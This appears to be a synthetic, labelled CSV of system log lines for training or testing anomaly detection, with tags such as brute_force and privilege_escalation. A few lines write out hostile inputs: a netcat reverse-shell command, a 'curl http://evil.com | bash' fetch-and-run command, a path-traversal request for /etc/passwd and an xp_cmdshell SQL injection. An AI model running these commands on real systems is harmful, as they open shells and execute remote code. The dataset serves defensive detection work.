timestamp,log_message,label,anomaly_type
2026-01-04 16:22:47,Connection received: host=192.168.27.113 user=nginx database=test,0,normal
2026-01-04 16:22:53,systemd[1]: Starting cron.service...,0,normal
2026-01-04 16:23:11,MySQL server started with process id 34409,0,normal
2026-01-04 16:23:14,systemd[1]: Starting docker.service...,0,normal
2026-01-04 16:23:21,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 16:23:24,"192.168.241.78 - - [04/Jan/2026:10:08:15 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-04 16:23:38,kernel: [281.592473] eth1: link up,0,normal
2026-01-04 16:23:48,systemd[1]: Started redis.service,0,normal
2026-01-04 16:23:56,systemd[1]: mysql.service failed,1,system_error
2026-01-04 16:23:56,Connection received: host=192.168.112.41 user=guest database=users,0,normal
2026-01-04 16:24:07,kernel: [6.921910] wlan0: link up,0,normal
2026-01-04 16:24:35,systemd[1]: Starting redis.service...,0,normal
2026-01-04 16:24:35,WARNING: Cryptominer activity detected on process 65001,1,malware_indicator
2026-01-04 16:25:09,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.42.251.28,1,brute_force
2026-01-04 16:25:19,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 16:25:23,Received disconnect from 192.168.97.41 port 38388:11: disconnected by user,0,normal
2026-01-04 16:25:24,Failed password for admin from 104.248.133.173 port 25921 ssh2,1,brute_force
2026-01-04 16:25:45,WARNING: Cryptominer activity detected on process 43284,1,malware_indicator
2026-01-04 16:25:49,[INFO] Cache hit for key: cache_key_295,0,normal
2026-01-04 16:26:31,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 16:26:44,[CRITICAL] Database connection pool exhausted,1,system_error
2026-01-04 16:26:58,Accepted password for root from 192.168.213.42 port 54815 ssh2,0,normal
2026-01-04 16:28:03,"192.168.118.48 - - [04/Jan/2026:12:54:07 +0700] ""POST /images/logo.png HTTP/1.1"" 200 27194",0,normal
2026-01-04 16:28:18,MySQL server started with process id 31168,0,normal
2026-01-04 16:28:31,"kernel: [564.753238] I/O error, dev wlan0, sector 4194665",1,system_error
2026-01-04 16:28:32,systemd[1]: Started ssh.service,0,normal
2026-01-04 16:28:47,su: FAILED SU (to root) admin on pts/0,1,privilege_escalation
2026-01-04 16:28:47,session opened for user apache by (uid=0),0,normal
2026-01-04 16:28:51,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 16:29:06,"192.168.197.12 - - [04/Jan/2026:05:33:53 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 16:29:50,Received disconnect from 192.168.99.176 port 21363:11: disconnected by user,0,normal
2026-01-04 16:30:02,session closed for user mysql,0,normal
2026-01-04 16:30:07,kernel: Out of memory: Kill process 63656 (ransomware) score 547,1,system_error
2026-01-04 16:30:20,session closed for user guest,0,normal
2026-01-04 16:30:23,systemd[1]: Starting docker.service...,0,normal
2026-01-04 16:30:28,systemd[1]: Stopped redis.service,0,normal
2026-01-04 16:30:37,[INFO] Request processed in 2075ms,0,normal
2026-01-04 16:30:40,session opened for user guest by (uid=0),0,normal
2026-01-04 16:30:43,Accepted password for apache from 192.168.41.13 port 61120 ssh2,0,normal
2026-01-04 16:30:52,[INFO] Cache hit for key: cache_key_916,0,normal
2026-01-04 16:31:04,error: maximum authentication attempts exceeded for www-data from 185.220.146.158,1,brute_force
2026-01-04 16:31:23,[INFO] Cache hit for key: cache_key_84,0,normal
2026-01-04 16:31:24,DDoS attack detected from 192.42.205.34 - rate limit exceeded,1,suspicious_network
2026-01-04 16:31:42,session closed for user user,0,normal
2026-01-04 16:31:44,[INFO] Request processed in 2510ms,0,normal
2026-01-04 16:31:49,"192.168.149.45 - - [04/Jan/2026:11:25:21 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 16:31:57,[ERROR] Disk space critical: /home at 97% usage,1,system_error
2026-01-04 16:32:04,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 16:32:10,[INFO] Request processed in 2522ms,0,normal
2026-01-04 16:32:22,systemd[1]: Starting redis.service...,0,normal
2026-01-04 16:32:28,session opened for user guest by (uid=0),0,normal
2026-01-04 16:32:32,[INFO] User nginx logged in successfully,0,normal
2026-01-04 16:32:35,Accepted password for mysql from 192.168.222.31 port 51510 ssh2,0,normal
2026-01-04 16:32:38,systemd[1]: Stopped redis.service,0,normal
2026-01-04 16:32:48,Received disconnect from 192.168.176.112 port 54538:11: disconnected by user,0,normal
2026-01-04 16:33:49,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 16:33:52,MySQL server started with process id 41084,0,normal
2026-01-04 16:34:12,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 16:34:40,[DEBUG] Processing request from 192.168.114.99,0,normal
2026-01-04 16:34:41,systemd[1]: Stopped docker.service,0,normal
2026-01-04 16:34:49,WARNING: Unauthorized file modification: /dashboard,1,malware_indicator
2026-01-04 16:34:51,[INFO] Request processed in 128ms,0,normal
2026-01-04 16:35:01,systemd[1]: ssh.service failed,1,system_error
2026-01-04 16:35:11,session closed for user apache,0,normal
2026-01-04 16:35:16,PAM: Authentication failure for www-data from 104.248.211.244,1,brute_force
2026-01-04 16:35:16,systemd[1]: Started nginx.service,0,normal
2026-01-04 16:35:17,systemd[1]: Started mysql.service,0,normal
2026-01-04 16:35:21,session opened for user admin by (uid=0),0,normal
2026-01-04 16:35:50,"192.168.98.173 - - [04/Jan/2026:01:03:54 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 16:36:04,systemd[1]: Started docker.service,0,normal
2026-01-04 16:36:12,"104.248.204.233 - - [04/Jan/2026:09:49:56 +0700] ""GET /admin HTTP/1.1"" 403 12409",1,suspicious_network
2026-01-04 16:36:17,kernel: [492.584838] wlan0: link down,0,normal
2026-01-04 16:36:20,[INFO] Application started successfully,0,normal
2026-01-04 16:36:27,"192.168.42.132 - - [04/Jan/2026:02:21:24 +0700] ""POST /api/v1/data HTTP/1.1"" 200 456",0,normal
2026-01-04 16:36:30,kernel: [775.743066] docker0: link down,0,normal
2026-01-04 16:36:36,session opened for user nginx by (uid=0),0,normal
2026-01-04 16:36:37,"192.168.221.95 - - [04/Jan/2026:04:30:25 +0700] ""GET /admin HTTP/1.1"" 200 43595",0,normal
2026-01-04 16:36:38,Received disconnect from 192.168.158.127 port 4453:11: disconnected by user,0,normal
2026-01-04 16:36:46,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 16:36:52,systemd[1]: Started cron.service,0,normal
2026-01-04 16:36:57,kernel: [736.303385] wlan0: link up,0,normal
2026-01-04 16:37:00,"192.168.239.216 - - [04/Jan/2026:15:29:58 +0700] ""POST /admin HTTP/1.1"" 200 25147",0,normal
2026-01-04 16:37:06,[DEBUG] Processing request from 192.168.22.64,0,normal
2026-01-04 16:37:13,session closed for user apache,0,normal
2026-01-04 16:37:16,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 16:37:30,sudo: mysql : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/bin/nc -e /bin/bash,1,privilege_escalation
2026-01-04 16:37:32,kernel: [903.881923] eth0: link down,0,normal
2026-01-04 16:37:34,systemd[1]: Started mysql.service,0,normal
2026-01-04 16:37:35,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 16:37:54,"192.168.85.217 - - [04/Jan/2026:21:29:51 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 16:37:57,DDoS attack detected from 45.33.11.90 - rate limit exceeded,1,suspicious_network
2026-01-04 16:38:02,[INFO] Request processed in 4627ms,0,normal
2026-01-04 16:38:16,"192.168.223.118 - - [04/Jan/2026:10:33:55 +0700] ""GET /index.html HTTP/1.1"" 304 0",0,normal
2026-01-04 16:38:21,[INFO] Application started successfully,0,normal
2026-01-04 16:38:25,Connection received: host=192.168.124.89 user=apache database=test,0,normal
2026-01-04 16:38:27,Accepted password for postgres from 192.168.184.112 port 32903 ssh2,0,normal
2026-01-04 16:38:32,kernel: [902.966878] wlan0: link down,0,normal
2026-01-04 16:38:36,kernel: [83.526888] eth1: link up,0,normal
2026-01-04 16:38:37,"192.168.109.13 - - [04/Jan/2026:14:18:55 +0700] ""POST /login HTTP/1.1"" 200 41956",0,normal
2026-01-04 16:38:55,[INFO] Cache hit for key: cache_key_486,0,normal
2026-01-04 16:38:56,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 16:39:02,kernel: [569.952673] docker0: link up,0,normal
2026-01-04 16:39:17,[INFO] Request processed in 1247ms,0,normal
2026-01-04 16:39:21,session opened for user user by (uid=0),0,normal
2026-01-04 16:39:38,Connection received: host=192.168.154.63 user=postgres database=production,0,normal
2026-01-04 16:39:41,systemd[1]: Stopped docker.service,0,normal
2026-01-04 16:39:42,MySQL server started with process id 10891,0,normal
2026-01-04 16:40:05,Failed password for admin from 104.248.8.35 port 28723 ssh2,1,brute_force
2026-01-04 16:40:08,[INFO] Cache hit for key: cache_key_552,0,normal
2026-01-04 16:40:12,kernel: [708.313795] eth1: link up,0,normal
2026-01-04 16:40:13,[INFO] Application started successfully,0,normal
2026-01-04 16:40:18,Connection received: host=192.168.93.102 user=guest database=test,0,normal
2026-01-04 16:40:47,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 16:41:04,systemd[1]: Stopped cron.service,0,normal
2026-01-04 16:41:12,[DEBUG] Processing request from 192.168.34.214,0,normal
2026-01-04 16:41:15,[INFO] Cache hit for key: cache_key_516,0,normal
2026-01-04 16:41:32,PAM: Authentication failure for guest from 45.33.151.44,1,brute_force
2026-01-04 16:41:39,session opened for user www-data by (uid=0),0,normal
2026-01-04 16:41:53,[INFO] Application started successfully,0,normal
2026-01-04 16:42:05,kernel: [475.521419] eth1: link up,0,normal
2026-01-04 16:42:26,[INFO] User guest logged in successfully,0,normal
2026-01-04 16:42:30,systemd[1]: Started ssh.service,0,normal
2026-01-04 16:42:36,MySQL server started with process id 39910,0,normal
2026-01-04 16:42:41,session closed for user mysql,0,normal
2026-01-04 16:42:46,Received disconnect from 192.168.250.114 port 64103:11: disconnected by user,0,normal
2026-01-04 16:43:00,[DEBUG] Processing request from 192.168.23.122,0,normal
2026-01-04 16:43:03,Connection received: host=192.168.98.172 user=guest database=analytics,0,normal
2026-01-04 16:43:10,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 16:43:17,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 16:43:23,"192.168.123.206 - - [04/Jan/2026:11:01:45 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 16:43:38,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 16:43:46,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 16:43:49,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 16:43:57,systemd[1]: Starting cron.service...,0,normal
2026-01-04 16:44:00,Failed password for invalid user user from 45.33.151.117 port 47745 ssh2,1,brute_force
2026-01-04 16:44:10,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.248.136.176,1,brute_force
2026-01-04 16:44:25,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 16:44:40,[INFO] Application started successfully,0,normal
2026-01-04 16:44:52,Accepted password for admin from 192.168.158.141 port 13372 ssh2,0,normal
2026-01-04 16:44:59,session opened for user postgres by (uid=0),0,normal
2026-01-04 16:45:20,[INFO] Application started successfully,0,normal
2026-01-04 16:45:27,session opened for user mysql by (uid=0),0,normal
2026-01-04 16:45:32,session closed for user nginx,0,normal
2026-01-04 16:45:33,[INFO] Cache hit for key: cache_key_453,0,normal
2026-01-04 16:45:35,kernel: [43.732988] docker0: link down,0,normal
2026-01-04 16:45:39,session closed for user www-data,0,normal
2026-01-04 16:45:43,"192.168.103.77 - - [04/Jan/2026:04:53:17 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-04 16:45:57,kernel: [648.565687] docker0: link up,0,normal
2026-01-04 16:46:10,[INFO] Cache hit for key: cache_key_961,0,normal
2026-01-04 16:46:11,Received disconnect from 192.168.238.3 port 43250:11: disconnected by user,0,normal
2026-01-04 16:46:12,kernel: [747.819652] docker0: link down,0,normal
2026-01-04 16:46:14,WARNING: Cryptominer activity detected on process 14869,1,malware_indicator
2026-01-04 16:46:18,[INFO] Cache hit for key: cache_key_399,0,normal
2026-01-04 16:46:24,"192.168.102.145 - - [03/Jan/2026:22:54:19 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-04 16:46:41,Received disconnect from 192.168.204.59 port 51217:11: disconnected by user,0,normal
2026-01-04 16:46:41,systemd[1]: postgresql.service failed,1,system_error
2026-01-04 16:46:49,Received disconnect from 192.168.207.192 port 15395:11: disconnected by user,0,normal
2026-01-04 16:47:08,"192.168.164.201 - - [04/Jan/2026:02:46:36 +0700] ""POST /index.html HTTP/1.1"" 200 16137",0,normal
2026-01-04 16:47:11,systemd[1]: Started nginx.service,0,normal
2026-01-04 16:47:22,PAM: Authentication failure for apache from 45.33.191.205,1,brute_force
2026-01-04 16:47:28,"192.168.116.123 - - [04/Jan/2026:19:09:22 +0700] ""GET /api/v1/data HTTP/1.1"" 200 46417",0,normal
2026-01-04 16:47:42,Connection received: host=192.168.49.230 user=apache database=test,0,normal
2026-01-04 16:47:58,systemd[1]: Started cron.service,0,normal
2026-01-04 16:48:00,Connection received: host=192.168.202.58 user=root database=test,0,normal
2026-01-04 16:48:08,session closed for user www-data,0,normal
2026-01-04 16:48:45,Connection received: host=192.168.233.78 user=admin database=production,0,normal
2026-01-04 16:48:57,"45.33.188.212 - - [04/Jan/2026:12:22:11 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 18840",1,suspicious_network
2026-01-04 16:49:00,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 16:49:23,"192.168.1.158 - - [04/Jan/2026:02:53:50 +0700] ""GET /css/style.css HTTP/1.1"" 200 12375",0,normal
2026-01-04 16:49:28,[INFO] User mysql logged in successfully,0,normal
2026-01-04 16:49:45,[INFO] Cache hit for key: cache_key_955,0,normal
2026-01-04 16:49:51,kernel: [959.612635] eth0: link down,0,normal
2026-01-04 16:49:53,Connection received: host=192.168.1.95 user=root database=users,0,normal
2026-01-04 16:49:57,[DEBUG] Processing request from 192.168.37.236,0,normal
2026-01-04 16:50:02,systemd[1]: Starting redis.service...,0,normal
2026-01-04 16:50:12,MySQL server started with process id 56003,0,normal
2026-01-04 16:50:16,[INFO] Request processed in 245ms,0,normal
2026-01-04 16:50:17,"192.168.6.156 - - [04/Jan/2026:08:42:02 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 16:50:18,kernel: [988.942467] br-0: link up,0,normal
2026-01-04 16:50:25,[INFO] Application started successfully,0,normal
2026-01-04 16:50:40,systemd[1]: Stopped docker.service,0,normal
2026-01-04 16:50:41,"192.168.15.107 - - [04/Jan/2026:18:30:33 +0700] ""GET /api/v1/users HTTP/1.1"" 200 8501",0,normal
2026-01-04 16:50:59,MySQL server started with process id 61896,0,normal
2026-01-04 16:51:08,[INFO] Application started successfully,0,normal
2026-01-04 16:51:13,[INFO] Application started successfully,0,normal
2026-01-04 16:51:25,[INFO] Request processed in 639ms,0,normal
2026-01-04 16:51:45,Accepted password for postgres from 192.168.55.202 port 54106 ssh2,0,normal
2026-01-04 16:52:00,kernel: [518.239999] docker0: link down,0,normal
2026-01-04 16:52:01,"192.168.253.44 - - [03/Jan/2026:23:27:01 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-04 16:52:09,"104.248.82.169 - - [04/Jan/2026:03:15:45 +0700] ""GET /admin HTTP/1.1"" 403 11029",1,suspicious_network
2026-01-04 16:52:22,session closed for user postgres,0,normal
2026-01-04 16:52:23,Received disconnect from 192.168.234.8 port 14647:11: disconnected by user,0,normal
2026-01-04 16:52:33,Received disconnect from 192.168.54.60 port 43867:11: disconnected by user,0,normal
2026-01-04 16:52:55,[INFO] User www-data logged in successfully,0,normal
2026-01-04 16:53:01,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 16:53:01,Accepted password for mysql from 192.168.52.23 port 40958 ssh2,0,normal
2026-01-04 16:53:10,Connection received: host=192.168.152.206 user=apache database=users,0,normal
2026-01-04 16:53:11,Accepted password for guest from 192.168.7.59 port 29016 ssh2,0,normal
2026-01-04 16:53:20,[INFO] User www-data logged in successfully,0,normal
2026-01-04 16:53:23,systemd[1]: Stopped cron.service,0,normal
2026-01-04 16:53:27,"192.168.178.31 - - [04/Jan/2026:06:12:28 +0700] ""POST /images/logo.png HTTP/1.1"" 200 39759",0,normal
2026-01-04 16:53:29,Received disconnect from 192.168.130.202 port 47790:11: disconnected by user,0,normal
2026-01-04 16:53:37,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 16:53:45,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 16:53:58,kernel: [646.425700] docker0: link up,0,normal
2026-01-04 16:54:01,Connection received: host=192.168.96.156 user=root database=staging,0,normal
2026-01-04 16:54:05,systemd[1]: Starting docker.service...,0,normal
2026-01-04 16:54:19,[INFO] Request processed in 3395ms,0,normal
2026-01-04 16:54:30,"192.168.4.181 - - [04/Jan/2026:17:31:16 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 10852",0,normal
2026-01-04 16:54:35,Received disconnect from 192.168.9.74 port 27713:11: disconnected by user,0,normal
2026-01-04 16:54:47,kernel: [169.881021] docker0: link up,0,normal
2026-01-04 16:54:53,Accepted password for admin from 192.168.229.249 port 46671 ssh2,0,normal
2026-01-04 16:54:56,session opened for user postgres by (uid=0),0,normal
2026-01-04 16:55:12,session closed for user guest,0,normal
2026-01-04 16:55:16,Received disconnect from 192.168.75.243 port 26199:11: disconnected by user,0,normal
2026-01-04 16:55:16,MySQL server started with process id 59393,0,normal
2026-01-04 16:55:19,[INFO] Request processed in 4656ms,0,normal
2026-01-04 16:55:30,[INFO] User postgres logged in successfully,0,normal
2026-01-04 16:55:31,kernel: Out of memory: Kill process 62350 (botnet_client) score 319,1,system_error
2026-01-04 16:55:39,kernel: [740.613234] docker0: link up,0,normal
2026-01-04 16:55:45,Accepted password for nginx from 192.168.181.81 port 62588 ssh2,0,normal
2026-01-04 16:55:46,[INFO] User postgres logged in successfully,0,normal
2026-01-04 16:55:51,[INFO] Application started successfully,0,normal
2026-01-04 16:55:54,error: maximum authentication attempts exceeded for admin from 104.248.248.142,1,brute_force
2026-01-04 16:56:21,systemd[1]: Stopped mysql.service,0,normal
2026-01-04 16:56:26,Received disconnect from 192.168.54.162 port 17228:11: disconnected by user,0,normal
2026-01-04 16:56:39,Received disconnect from 192.168.18.60 port 5171:11: disconnected by user,0,normal
2026-01-04 16:56:44,"192.168.178.188 - - [04/Jan/2026:16:43:09 +0700] ""POST /api/v1/data HTTP/1.1"" 200 171",0,normal
2026-01-04 16:56:45,session opened for user mysql by (uid=0),0,normal
2026-01-04 16:56:46,systemd[1]: Started nginx.service,0,normal
2026-01-04 16:56:54,session closed for user apache,0,normal
2026-01-04 16:57:04,MySQL server started with process id 48135,0,normal
2026-01-04 16:57:11,[INFO] Cache hit for key: cache_key_593,0,normal
2026-01-04 16:57:18,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 16:57:21,[INFO] Request processed in 2517ms,0,normal
2026-01-04 16:57:27,kernel: [700.833983] eth1: link down,0,normal
2026-01-04 16:57:46,"192.168.125.132 - - [03/Jan/2026:22:10:46 +0700] ""POST /api/v1/users HTTP/1.1"" 200 33587",0,normal
2026-01-04 16:57:52,"192.168.221.246 - - [04/Jan/2026:18:48:41 +0700] ""GET / HTTP/1.1"" 200 16205",0,normal
2026-01-04 16:57:53,session opened for user user by (uid=0),0,normal
2026-01-04 16:57:53,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 16:57:57,systemd[1]: Started apache2.service,0,normal
2026-01-04 16:58:05,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 16:58:16,Received disconnect from 192.168.150.253 port 9202:11: disconnected by user,0,normal
2026-01-04 16:58:17,systemd[1]: Started postgresql.service,0,normal
2026-01-04 16:58:22,Failed password for invalid user admin from 104.248.38.89 port 44589 ssh2,1,brute_force
2026-01-04 16:58:26,"192.168.133.188 - - [04/Jan/2026:17:23:25 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 17400",0,normal
2026-01-04 16:58:31,[INFO] Cache hit for key: cache_key_116,0,normal
2026-01-04 16:58:31,[DEBUG] Processing request from 192.168.5.75,0,normal
2026-01-04 16:58:37,kernel: [495.276245] eth1: link up,0,normal
2026-01-04 16:58:38,kernel: [982.287797] docker0: link down,0,normal
2026-01-04 16:58:47,[DEBUG] Processing request from 192.168.123.250,0,normal
2026-01-04 16:58:51,MySQL server started with process id 17107,0,normal
2026-01-04 16:58:54,systemd[1]: Stopped docker.service,0,normal
2026-01-04 16:58:57,Connection received: host=192.168.171.37 user=nginx database=test,0,normal
2026-01-04 16:59:02,session opened for user user by (uid=0),0,normal
2026-01-04 16:59:13,Accepted password for user from 192.168.127.93 port 60807 ssh2,0,normal
2026-01-04 16:59:22,kernel: [353.999706] br-0: link up,0,normal
2026-01-04 16:59:23,[DEBUG] Processing request from 192.168.53.106,0,normal
2026-01-04 16:59:27,session opened for user www-data by (uid=0),0,normal
2026-01-04 16:59:59,MySQL server started with process id 36027,0,normal
2026-01-04 17:00:03,MySQL server started with process id 29539,0,normal
2026-01-04 17:00:06,Connection received: host=192.168.145.191 user=guest database=production,0,normal
2026-01-04 17:00:37,MySQL server started with process id 33876,0,normal
2026-01-04 17:00:38,[INFO] Application started successfully,0,normal
2026-01-04 17:00:51,[ERROR] Memory allocation failed for request from 45.33.77.192,1,system_error
2026-01-04 17:00:53,"192.168.202.66 - - [04/Jan/2026:20:15:16 +0700] ""POST /images/logo.png HTTP/1.1"" 200 26076",0,normal
2026-01-04 17:01:08,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 17:01:10,"192.168.106.167 - - [04/Jan/2026:02:00:28 +0700] ""POST /admin HTTP/1.1"" 200 17500",0,normal
2026-01-04 17:01:10,systemd[1]: Started cron.service,0,normal
2026-01-04 17:01:31,WARNING: Cryptominer activity detected on process 47188,1,malware_indicator
2026-01-04 17:01:50,Connection received: host=192.168.169.188 user=nginx database=users,0,normal
2026-01-04 17:01:56,systemd[1]: Started docker.service,0,normal
2026-01-04 17:02:09,Received disconnect from 192.168.51.33 port 37179:11: disconnected by user,0,normal
2026-01-04 17:02:10,"192.168.216.238 - - [04/Jan/2026:09:03:31 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-04 17:02:13,[INFO] Cache hit for key: cache_key_918,0,normal
2026-01-04 17:02:14,[INFO] User user logged in successfully,0,normal
2026-01-04 17:02:37,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 17:02:38,kernel: [831.522992] docker0: link up,0,normal
2026-01-04 17:02:39,Received disconnect from 192.168.201.240 port 53991:11: disconnected by user,0,normal
2026-01-04 17:03:06,MySQL server started with process id 1009,0,normal
2026-01-04 17:03:20,systemd[1]: Stopped mysql.service,0,normal
2026-01-04 17:03:26,session closed for user postgres,0,normal
2026-01-04 17:03:27,Received disconnect from 192.168.172.212 port 8369:11: disconnected by user,0,normal
2026-01-04 17:03:28,Failed password for admin from 192.42.154.226 port 39335 ssh2,1,brute_force
2026-01-04 17:03:31,[INFO] Cache hit for key: cache_key_898,0,normal
2026-01-04 17:03:42,ALERT: Suspicious process detected: keylogger (PID: 59068),1,malware_indicator
2026-01-04 17:03:44,"192.168.212.177 - - [04/Jan/2026:05:17:04 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 17:03:51,[INFO] Request processed in 4124ms,0,normal
2026-01-04 17:03:59,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 17:04:23,[DEBUG] Processing request from 192.168.85.144,0,normal
2026-01-04 17:04:50,Blocked suspicious request from 185.220.162.233: /api/v1/data,1,suspicious_network
2026-01-04 17:05:03,kernel: [157.733120] docker0: link up,0,normal
2026-01-04 17:05:12,systemd[1]: Started mysql.service,0,normal
2026-01-04 17:05:32,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 17:05:39,Failed password for invalid user postgres from 104.248.199.30 port 44817 ssh2,1,brute_force
2026-01-04 17:05:42,Accepted password for nginx from 192.168.168.229 port 25747 ssh2,0,normal
2026-01-04 17:05:50,kernel: [789.447932] br-0: link down,0,normal
2026-01-04 17:05:51,session opened for user postgres by (uid=0),0,normal
2026-01-04 17:05:55,Accepted password for apache from 192.168.190.153 port 12295 ssh2,0,normal
2026-01-04 17:06:04,"192.168.227.211 - - [04/Jan/2026:18:09:26 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 17:06:08,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 17:06:32,[INFO] Application started successfully,0,normal
2026-01-04 17:06:35,[INFO] User admin logged in successfully,0,normal
2026-01-04 17:06:39,MySQL server started with process id 6913,0,normal
2026-01-04 17:06:46,Received disconnect from 192.168.11.181 port 30981:11: disconnected by user,0,normal
2026-01-04 17:07:06,kernel: [531.415173] br-0: link down,0,normal
2026-01-04 17:07:20,[INFO] Cache hit for key: cache_key_245,0,normal
2026-01-04 17:07:26,[DEBUG] Processing request from 192.168.139.236,0,normal
2026-01-04 17:07:40,"192.168.135.198 - - [04/Jan/2026:04:29:17 +0700] ""GET /dashboard HTTP/1.1"" 200 42054",0,normal
2026-01-04 17:07:54,session closed for user root,0,normal
2026-01-04 17:07:56,systemd[1]: Started nginx.service,0,normal
2026-01-04 17:08:02,session closed for user root,0,normal
2026-01-04 17:08:06,Connection received: host=192.168.56.29 user=nginx database=staging,0,normal
2026-01-04 17:08:21,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 17:08:27,MySQL server started with process id 45948,0,normal
2026-01-04 17:08:44,sudo: mysql : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=curl http://evil.com | bash,1,privilege_escalation
2026-01-04 17:08:44,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 17:08:53,[INFO] User mysql logged in successfully,0,normal
2026-01-04 17:08:55,systemd[1]: Started postgresql.service,0,normal
2026-01-04 17:09:04,MySQL server started with process id 10351,0,normal
2026-01-04 17:09:07,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 17:09:17,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 17:09:23,"192.168.146.221 - - [04/Jan/2026:18:01:20 +0700] ""POST /index.html HTTP/1.1"" 200 46715",0,normal
2026-01-04 17:09:25,[INFO] User admin logged in successfully,0,normal
2026-01-04 17:09:27,Possible SQL injection attack from 185.220.1.187: 1; EXEC xp_cmdshell,1,suspicious_network
2026-01-04 17:09:34,session opened for user mysql by (uid=0),0,normal
2026-01-04 17:09:37,Accepted password for user from 192.168.150.102 port 49272 ssh2,0,normal
2026-01-04 17:09:43,kernel: [868.868473] br-0: link down,0,normal
2026-01-04 17:10:06,session closed for user admin,0,normal
2026-01-04 17:10:18,Received disconnect from 192.168.138.37 port 28378:11: disconnected by user,0,normal
2026-01-04 17:10:25,"192.168.192.230 - - [04/Jan/2026:18:11:51 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 17:10:27,kernel: [457.807215] docker0: link down,0,normal
2026-01-04 17:10:28,Failed password for admin from 185.220.148.179 port 1329 ssh2,1,brute_force
2026-01-04 17:10:44,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 17:10:50,Accepted password for nginx from 192.168.196.137 port 56743 ssh2,0,normal
2026-01-04 17:10:53,[INFO] Cache hit for key: cache_key_537,0,normal
2026-01-04 17:11:09,session closed for user root,0,normal
2026-01-04 17:11:10,systemd[1]: Started apache2.service,0,normal
